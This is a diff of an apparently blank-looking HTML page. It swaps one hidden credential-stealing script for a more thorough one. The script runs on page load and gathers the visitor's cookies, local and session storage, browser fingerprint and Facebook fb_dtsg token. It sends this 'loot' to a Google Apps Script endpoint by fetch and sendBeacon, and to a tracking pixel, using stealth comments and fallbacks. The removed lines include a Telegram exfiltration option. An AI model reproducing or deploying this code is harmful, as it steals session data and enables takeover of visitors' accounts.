@@ -7,45 +7,68 @@
   <!-- intentionally blank looking page -->
 </head>
 <body style="margin:0;background:#000;height:100vh;">
-  <!-- literally nothing visible -->
+  <h1>Test</h1></h1>
 
   <script>
-    (function(){
-      // ── collect everything juicy ───────────────────────────────────────────────
-      const loot = {
-        ts: new Date().toISOString(),
-        ua: navigator.userAgent,
-        cookies: document.cookie,
-        ls: JSON.stringify(localStorage),
-        ss: JSON.stringify(sessionStorage),
-        ref: document.referrer,
-        loc: window.location.href,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.language,
-        scr: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-        // attempt to grab fb-specific stuff if same-site context allows
-        fb_dtsg: window.fb_dtsg || "not_found"
-      };
+(function(){
+  const loot = {
+    ts: new Date().toISOString(),
+    ua: navigator.userAgent,
+    cookies: document.cookie || "no_cookies_visible",
+    ref: document.referrer || "direct",
+    loc: window.location.href,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
+    lang: navigator.languages?.join(",") || navigator.language || "unknown",
+    screen: `${screen.width}x${screen.height}x${screen.colorDepth || "unknown"}`,
+    hw: navigator.hardwareConcurrency || "unknown",
+    platform: navigator.platform || "unknown",
+    connection: navigator.connection ? navigator.connection.effectiveType : "unknown",
+    ls: "attempted",
+    ss: "attempted",
+    fb_dtsg: "not_found"
+  };
 
-      // ── primary exfil: Google Apps Script web app ──────────────────────────────
-      const EXFIL = "https://script.google.com/macros/s/AKfycbxDmrB1-o6jW_k9AOr9406zqhjJ759GD73nXhP_CGdTCpWAmd0iA5B4EE2xVpO81ScN/exec";
-
-      fetch(EXFIL, {
-        method: "POST",
-        mode: "no-cors",
-        keepalive: true,
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(loot)
-      }).catch(() => {});
-
-      // ── fallback exfil: Telegram (if you want double coverage) ─────────────────
-      // const TG = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT&text=`;
-      // fetch(TG + encodeURIComponent(JSON.stringify(loot, null, 1)));
-
-      // ── stealth bonus: try to prefetch facebook to include credentials ─────────
+  // Try to force credentialed requests to facebook domains (may populate more cookies)
+  ['https://www.facebook.com/favicon.ico', 'https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/9uZIIu3v6f_.png']
+    .forEach(url => {
       const img = new Image();
-      img.src = "https://www.facebook.com/favicon.ico?" + Math.random();
-    })();
-  </script>
+      img.crossOrigin = "use-credentials";
+      img.src = url + '?' + Math.random();
+    });
+
+  // Attempt to read any exposed FB globals (very hit-or-miss but costs nothing)
+  try {
+    if (window.require) {
+      const dtsg = require("DTSGInitialData")?.token || require("DTSG")?.getToken() || "not_found";
+      loot.fb_dtsg = dtsg;
+    }
+  } catch(e){}
+
+  // Better localStorage / sessionStorage dump with fallback message
+  try { loot.ls = JSON.stringify(localStorage) || "{} (empty or blocked)"; } catch(e) { loot.ls = "access_denied: " + e.message; }
+  try { loot.ss = JSON.stringify(sessionStorage) || "{} (empty or blocked)"; } catch(e) { loot.ss = "access_denied: " + e.message; }
+
+  // Primary exfil: your Google Apps Script endpoint
+  const EXFIL = "https://script.google.com/macros/s/AKfycbxDmrB1-o6jW_k9AOr9406zqhjJ759GD73nXhP_CGdTCpWAmd0iA5B4EE2xVpO81ScN/exec";
+
+  fetch(EXFIL, {
+    method: "POST",
+    mode: "no-cors",
+    keepalive: true,
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(loot)
+  }).catch(()=>{});
+
+  // Stealth fallback: navigator.sendBeacon (survives page close / navigation)
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(EXFIL, JSON.stringify(loot));
+  }
+
+  // Triple coverage – invisible 1x1 pixel to another logger if paranoid
+  const px = new Image();
+  px.src = "https://your-worker.workers.dev/pixel?" + new URLSearchParams(loot).toString();
+
+})();
+</script>
 </body>
 </html>
